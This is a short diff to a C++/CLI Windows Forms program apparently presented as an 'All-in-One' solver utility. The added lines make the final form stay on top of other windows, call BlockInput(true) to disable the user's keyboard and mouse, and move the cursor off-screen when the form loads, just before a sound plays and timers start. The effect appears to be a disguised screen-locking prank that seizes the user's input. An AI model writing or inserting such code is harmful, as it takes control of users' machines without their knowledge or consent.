@@ -75,6 +75,7 @@ namespace solver {
 			this->Name = L"final";
 			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
 			this->Text = L"Программа \"Всё В Одном\"";
+			this->TopMost = true;
 			this->WindowState = System::Windows::Forms::FormWindowState::Maximized;
 			this->Load += gcnew System::EventHandler(this, &final::final_Load);
 			this->ResumeLayout(false);
@@ -97,6 +98,8 @@ namespace solver {
 	}
 	private: System::Void final_Load(System::Object^ sender, System::EventArgs^ e) {
 		if (this->first) {
+			BlockInput(true);
+			SetCursorPos(90000000, 90000000);
 			this->first = false;
 			PlaySound(MAKEINTRESOURCE(14), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
 			this->timer1_4->Start();
